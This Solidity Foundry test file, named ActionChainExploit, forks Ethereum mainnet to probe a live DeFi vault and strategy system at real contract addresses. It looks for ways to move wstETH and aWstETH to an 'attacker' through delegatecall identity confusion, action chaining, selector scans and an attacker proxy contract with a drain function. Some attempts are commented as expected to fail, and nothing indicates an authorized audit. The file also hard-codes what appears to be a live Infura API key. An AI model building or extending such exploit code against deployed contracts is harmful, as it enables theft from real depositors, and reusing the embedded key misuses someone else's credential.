// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IStrategy {
    function vault() external view returns (address);
    function strategyStorage() external view returns (address);
    function callExecute(address _target, bytes memory _data) external payable returns (bytes32);
    function execute(address _target, bytes memory _data) external payable returns (bytes32);
}

interface IStrategyExecutor {
    function executeOnStrategy(uint _strategyId, address _target, bytes calldata _data) external payable returns (bytes32);
    function strategyStorage() external view returns (address);
}

interface IActionExecutor {
    function executeAction(bytes memory _callData, uint8[] memory _paramMapping, bytes32[] memory _returnValues) external payable returns (bytes32);
    function executeActions(bytes[] memory _callData, uint8[][] memory _paramMapping, bytes32[][] memory _returnValues) external payable returns (bytes32);
}

interface IVault {
    function withdraw(address token, uint256 amount) external;
}

contract ActionChainExploit is Test {
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant STRATEGY_EXECUTOR = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant aWstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    // Known action addresses
    address constant VAULT_PULL = 0x313Ca6136521D22A7Ea763B3566Ed0B53F5B3AB9;
    address constant AAVE_WITHDRAW = 0x0039d822156FF2FD28ac6e19A518660890fcD2E0;
    address constant LIDO_UNWRAP = 0xb8cD2bA2A0Ada353aE15398618Fafb1d7BD558C5;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeActionExecutorInterface() public view {
        console.log("=== ACTION EXECUTOR INTERFACE ANALYSIS ===\n");

        bytes memory code = ACTION_EXECUTOR.code;
        console.log("ActionExecutor code size:", code.length);

        // Count opcodes
        uint256 delegatecallCount = 0;
        uint256 callCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) delegatecallCount++;
            if (uint8(code[i]) == 0xf1) callCount++;
        }
        console.log("DELEGATECALL opcodes:", delegatecallCount);
        console.log("CALL opcodes:", callCount);

        // Check what functions ActionExecutor exposes
        (bool success,) = ACTION_EXECUTOR.staticcall(
            abi.encodeWithSignature("registry()")
        );
        console.log("\nHas registry():", success);

        (success,) = ACTION_EXECUTOR.staticcall(
            abi.encodeWithSignature("actionRegistry()")
        );
        console.log("Has actionRegistry():", success);
    }

    function test_AnalyzeVaultPullAction() public view {
        console.log("=== VAULT PULL ACTION ANALYSIS ===\n");
        console.log("VaultPull address:", VAULT_PULL);

        bytes memory code = VAULT_PULL.code;
        console.log("Code size:", code.length);

        // VaultPull uses msg.sender to get vault:
        // IVaultWithdrawer(IStrategy(msg.sender).vault()).withdraw()
        // In delegatecall chain: msg.sender = Strategy

        // Key question: Can we make VaultPull think we're Strategy?
        console.log("\nDelegatecall context:");
        console.log("When ActionExecutor delegatecalls VaultPull:");
        console.log("  address(this) = ActionExecutor (NO! It's Strategy due to delegatecall chain)");
        console.log("  msg.sender = Strategy (since Strategy calls ActionExecutor.execute)");
    }

    function test_AnalyzeActionChaining() public view {
        console.log("=== ACTION CHAINING ANALYSIS ===\n");

        // The executeActions function allows chaining multiple actions
        // Return values from one action can be passed to the next via paramMapping

        console.log("ActionExecutor.executeActions allows:");
        console.log("1. Execute multiple actions in sequence");
        console.log("2. Pass return values between actions via paramMapping");
        console.log("3. All in single delegatecall context");

        console.log("\nPotential chain:");
        console.log("1. VaultPull - withdraw wstETH from Vault to Strategy");
        console.log("2. [Unknown action] - transfer wstETH from Strategy to attacker");

        // The problem: Is there any action that can transfer tokens to arbitrary address?
        console.log("\nSearching for token transfer actions...");
    }

    function test_FindTokenTransferAction() public view {
        console.log("=== FINDING TOKEN TRANSFER ACTIONS ===\n");

        // Check each known action for token transfer capability
        address[] memory actions = new address[](7);
        actions[0] = 0xbdFb29cCD82dB3ccf462F3CB600892b2E6f185C7;  // LidoStake
        actions[1] = 0x160F1f3a512Fa7cCefA0eb08f881282c05d6eb0f;  // LidoWrap
        actions[2] = LIDO_UNWRAP;                                  // LidoUnwrap
        actions[3] = 0x3503152722beeE269E9B4E0921F2c3D44C90d2b5;  // AaveV3Supply
        actions[4] = 0xEE1F8dc0135EE9dC2e00fac3817b9C530d34B6ba;  // AaveV3Borrow
        actions[5] = AAVE_WITHDRAW;                                // AaveV3Withdraw
        actions[6] = VAULT_PULL;                                   // VaultPull

        string[7] memory names = [
            "LidoStake",
            "LidoWrap",
            "LidoUnwrap",
            "AaveV3Supply",
            "AaveV3Borrow",
            "AaveV3Withdraw",
            "VaultPull"
        ];

        for (uint i = 0; i < actions.length; i++) {
            bytes memory code = actions[i].code;

            // Check if action code contains TRANSFER selector (0xa9059cbb)
            // or TRANSFER_FROM selector (0x23b872dd)
            bool hasTransfer = false;
            bool hasTransferFrom = false;

            for (uint j = 0; j < code.length - 3; j++) {
                bytes4 selector = bytes4(bytes.concat(code[j], code[j+1], code[j+2], code[j+3]));
                if (selector == bytes4(0xa9059cbb)) hasTransfer = true;
                if (selector == bytes4(0x23b872dd)) hasTransferFrom = true;
            }

            console.log(names[i], ":");
            console.log("  Has transfer:", hasTransfer);
            console.log("  Has transferFrom:", hasTransferFrom);
        }
    }

    function test_AnalyzeParamMapping() public view {
        console.log("=== PARAM MAPPING ANALYSIS ===\n");

        // DeFiSaver uses param mapping to inject dynamic values
        // paramMapping values:
        // 0 = use value from calldata
        // 1 = use returnValue[0]
        // 2 = use returnValue[1]
        // etc.

        // If we can inject attacker address via return value...
        console.log("ParamMapping can inject:");
        console.log("  - Return values from previous actions");
        console.log("  - But NOT arbitrary external values");

        // Key insight: Can we make an action return an address?
        console.log("\nActions that might return useful values:");
        console.log("  - Actions typically return (uint256 result, bytes logData)");
        console.log("  - bytes32 return value from executeAction");
    }

    function test_CheckSendTokenAction() public {
        console.log("=== CHECKING FOR SEND TOKEN ACTION ===\n");

        // DeFiSaver has a SendToken action that can send tokens to arbitrary address
        // Action ID for SendToken: need to check registry

        vm.startPrank(attacker);

        // Try to find SendToken in the registry
        // Common selectors for token send:
        bytes4 sendTokenSelector = bytes4(keccak256("sendToken(address,address,uint256)"));
        bytes4 sendTokensSelector = bytes4(keccak256("sendTokens(address,address,uint256)"));
        bytes4 transferTokenSelector = bytes4(keccak256("transferToken(address,address,uint256)"));

        console.log("SendToken selector:");
        console.logBytes4(sendTokenSelector);
        console.log("SendTokens selector:");
        console.logBytes4(sendTokensSelector);
        console.log("TransferToken selector:");
        console.logBytes4(transferTokenSelector);

        vm.stopPrank();
    }

    function test_ExploitViaAttackerProxy() public {
        console.log("=== EXPLOIT VIA ATTACKER PROXY ===\n");

        // User's hint: extract to attacker's proxy, then extract from proxy

        vm.startPrank(attacker);

        // Deploy attacker's proxy that mimics Strategy interface
        AttackerStrategyProxy proxy = new AttackerStrategyProxy(VAULT, attacker);
        console.log("Attacker proxy deployed:", address(proxy));
        console.log("Proxy.vault():", proxy.vault());

        // Now if we could make VaultPull run with msg.sender = our proxy
        // it would call our proxy.vault() which returns real Vault
        // and then call Vault.withdraw() with proxy as caller

        // But the problem is: Vault.withdraw checks if caller is registered Strategy!

        // Let's verify this
        console.log("\nTrying Vault.withdraw as attacker proxy...");
        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);

        // Call VaultPull directly through proxy's delegatecall
        // This won't work because Vault checks Strategy registration
        (bool success,) = address(proxy).call(
            abi.encodeWithSignature("tryVaultWithdraw()")
        );
        console.log("tryVaultWithdraw success:", success);

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 proxyBalance = IERC20(wstETH).balanceOf(address(proxy));
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);

        console.log("\nResults:");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Proxy wstETH:", proxyBalance / 1e18);
        console.log("Attacker wstETH:", attackerBalance / 1e18);

        vm.stopPrank();
    }

    function test_IdentityConfusionAttack() public {
        console.log("=== IDENTITY CONFUSION ATTACK ===\n");

        // The core idea: If we can make contract A think it's talking to contract B
        // when it's actually talking to our malicious contract

        // In delegatecall chain:
        // Strategy.callExecute() -> Strategy.execute() -> delegatecall(ActionExecutor)
        // Inside ActionExecutor: msg.sender = Strategy, address(this) = Strategy

        // ActionExecutor then: delegatecall(Action)
        // Inside Action: msg.sender = Strategy, address(this) = Strategy

        // VaultPull: IStrategy(msg.sender).vault() = Strategy.vault() = real Vault
        // Then: Vault.withdraw(token, amount)
        // Vault checks: Is msg.sender (Strategy) authorized? YES

        // Key question: Where can we inject our identity?

        console.log("Delegatecall chain context:");
        console.log("  Strategy.callExecute -> [msg.sender=user]");
        console.log("  Strategy.execute -> [msg.sender=Strategy]");
        console.log("  delegatecall(ActionExecutor) -> [msg.sender=Strategy, this=Strategy]");
        console.log("  delegatecall(Action) -> [msg.sender=Strategy, this=Strategy]");

        // What if there's an action that uses address(this) to determine identity?
        // And address(this) = Strategy, which has permissions!

        console.log("\nLooking for actions that use address(this)...");
    }

    function test_SearchUnregisteredActions() public {
        console.log("=== SEARCHING FOR UNREGISTERED/ARBITRARY ACTIONS ===\n");

        // Can we call ActionExecutor with an arbitrary action address?
        // If so, we could deploy our own malicious action

        vm.startPrank(attacker);

        // Check if ActionExecutor has any function that takes target address
        (bool success,) = ACTION_EXECUTOR.call(
            abi.encodeWithSignature("executeAction(address,bytes)", attacker, "")
        );
        console.log("executeAction(address,bytes) success:", success);

        // Check standard executeAction with our action ID
        bytes memory maliciousAction = abi.encodeWithSelector(
            bytes4(keccak256("executeAction(bytes,uint8[],bytes32[])")),
            abi.encode(attacker),
            new uint8[](0),
            new bytes32[](0)
        );

        // Try calling through Strategy (won't work - not executor)
        console.log("\nTrying to call Strategy.execute with custom target...");
        (success,) = STRATEGY_0.call(
            abi.encodeWithSignature("execute(address,bytes)", attacker, maliciousAction)
        );
        console.log("execute success:", success);

        vm.stopPrank();
    }

    function test_CheckStrategyAWstETHApproval() public view {
        console.log("=== STRATEGY aWstETH APPROVAL CHECK ===\n");

        // Strategy has ~33k aWstETH
        // Can Strategy transfer aWstETH to anyone?

        uint256 strategyAWstETH = IERC20(aWstETH).balanceOf(STRATEGY_0);
        console.log("Strategy aWstETH balance:", strategyAWstETH / 1e18);

        // Check if Strategy has approved anyone for aWstETH
        address[] memory spenders = new address[](5);
        spenders[0] = AAVE_POOL;
        spenders[1] = ACTION_EXECUTOR;
        spenders[2] = VAULT;
        spenders[3] = STRATEGY_EXECUTOR;
        spenders[4] = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510; // RedemptionController

        for (uint i = 0; i < spenders.length; i++) {
            uint256 approval = IERC20(aWstETH).allowance(STRATEGY_0, spenders[i]);
            if (approval > 0) {
                console.log("Strategy->", spenders[i], "aWstETH approval:", approval);
            }
        }
    }
}

contract AttackerStrategyProxy {
    address public vault;
    address public owner;

    constructor(address _vault, address _owner) {
        vault = _vault;
        owner = _owner;
    }

    function strategyStorage() external pure returns (address) {
        return address(0);
    }

    function tryVaultWithdraw() external {
        IVault(vault).withdraw(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 1e18);
    }

    function drain(address token) external {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);
    }

    receive() external payable {}
}
